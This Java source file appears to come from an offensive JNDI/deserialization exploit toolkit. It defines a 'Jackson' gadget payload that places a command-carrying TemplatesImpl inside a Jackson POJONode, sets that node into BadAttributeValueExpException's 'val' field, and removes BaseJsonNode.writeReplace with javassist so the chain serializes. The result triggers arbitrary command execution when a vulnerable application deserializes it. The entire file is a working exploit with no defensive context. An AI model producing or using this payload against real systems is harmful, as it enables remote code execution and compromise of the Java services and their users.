package com.qi4l.jndi.gadgets;

import com.fasterxml.jackson.databind.node.POJONode;
import com.qi4l.jndi.gadgets.utils.Gadgets;
import com.qi4l.jndi.gadgets.utils.Reflections;
import javassist.ClassPool;
import javassist.CtClass;
import javassist.CtMethod;

import javax.management.BadAttributeValueExpException;
import java.util.HashMap;


public class Jackson implements ObjectPayload<Object> {

    @Override
    public Object getObject(String command) throws Exception {
        final Object template;
        template = Gadgets.createTemplatesImpl(command);

        ClassPool pool = ClassPool.getDefault();
        //pool.insertClassPath(new ClassClassPath(Class.forName("com.fasterxml.jackson.databind.node.BaseJsonNode")));
        try {
            CtClass  ctClass      = pool.get("com.fasterxml.jackson.databind.node.BaseJsonNode");
            CtMethod writeReplace = ctClass.getDeclaredMethod("writeReplace");
            ctClass.removeMethod(writeReplace);
            // 将修改后的CtClass加载至当前线程的上下文类加载器中
            ctClass.toClass();
        } catch (Exception EE) {

        }


        POJONode node = new POJONode(template);

        BadAttributeValueExpException badAttributeValueExpException = new BadAttributeValueExpException(null);
        Reflections.setFieldValue(badAttributeValueExpException, "val", node);

        HashMap hashMap = new HashMap();
        hashMap.put(template, badAttributeValueExpException);

        return hashMap;
    }
}
